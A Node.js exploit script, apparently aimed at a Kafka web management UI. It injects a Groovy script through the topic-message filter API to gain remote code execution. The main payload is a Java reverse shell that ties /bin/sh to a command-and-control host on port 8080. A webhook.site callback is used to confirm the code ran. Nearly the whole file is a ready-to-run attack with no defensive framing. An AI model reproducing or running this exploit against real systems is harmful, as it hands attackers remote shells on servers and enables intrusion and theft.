const fetch = (...args) =>
  import('node-fetch').then(({ default: fetch }) => fetch(...args))

const querystring = require('querystring')

const url = 'http://localhost:8080'
let clusters = null
const c2 = '1.1.1.1'

async function getClusters() {
  const clusterFetch = await fetch(url + '/api/clusters')
  clusters = await clusterFetch.json()
}

async function getTopics(cluster) {
  const topicFetch = await fetch(
    `${url}/api/clusters/${cluster}/topics?showInternal=true&search=&orderBy=NAME&sortOrder=ASC`
  )
  const topics = (await topicFetch.json()).topics
  return topics
}

async function getWebhooks() {
  const webhookFetch = await fetch('https://webhook.site/token', {
    method: 'POST',
  })
  const webhookData = await webhookFetch.json()
  const webhook = `https://webhook.site/${webhookData.uuid}/`
  console.log('URL Created: ' + webhook)
  const token_id = webhookData.uuid
  const headers = { 'api-key': webhookData.uuid }
  return { webhook, token_id, headers }
}

;(async () => {
  try {
    await getClusters()

    const cluster = clusters[0].name

    const topics = await getTopics(cluster)
    const topic = topics[0].name

    const { webhook, token_id, headers } = await getWebhooks()

    const checkPayload = `new URL("${webhook}").text`

    const rcePayload = `String host="${c2}";int port=8080;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`

    const queryParams = querystring.stringify({
      q: rcePayload,
      filterQueryType: 'GROOVY_SCRIPT',
      attempt: 2,
      limit: 100,
      page: 0,
      seekDirection: 'FORWARD',
      keySerde: 'String',
      valueSerde: 'String',
      seekType: 'BEGINNING',
    })

    const r = await fetch(
      `${url}/api/clusters/local/topics/${topic}/messages?${queryParams}`,
      {
        timeout: 5000,
      }
    )
    console.log(await r.text())

    const requestFetch = await fetch(
      `https://webhook.site/token/${token_id}/requests?sorting=newest`,
      {
        headers,
      }
    )
    const requestData = await requestFetch.json()

    if (requestData.data.length === 0) {
      console.log('No rce found')
    } else {
      for (const request of requestData.data) {
        console.log(request)
      }
    }
  } catch (error) {
    if (error.name === 'AbortError') {
      console.log('Request timeout')
    } else {
      console.error(error.message)
    }
  }
})()
